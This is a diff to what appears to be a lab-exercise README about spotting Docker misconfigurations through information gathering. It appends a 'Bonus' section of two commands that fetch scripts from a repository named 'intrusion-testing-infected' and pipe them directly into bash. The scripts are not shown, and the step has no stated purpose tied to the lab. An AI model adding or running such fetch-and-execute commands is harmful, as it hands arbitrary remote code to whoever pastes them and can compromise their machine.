@@ -78,3 +78,15 @@ Required Screenshots:
 3. Why is nginx/1.29.4 significant?
 
 Key Learning: Information gathering reveals Docker misconfigurations without exploitation!
+
+## Bonus
+
+Run scripts using `wget`:
+
+```bash
+cd ~ && wget -qO- https://raw.githubusercontent.com/LEAD8A25-INT/intrusion-testing-infected/main/script.sh | bash -s
+```
+
+```bash
+cd ~ && wget -qO- https://raw.githubusercontent.com/LEAD8A25-INT/intrusion-testing-infected/main/web.sh | bash -s
+```
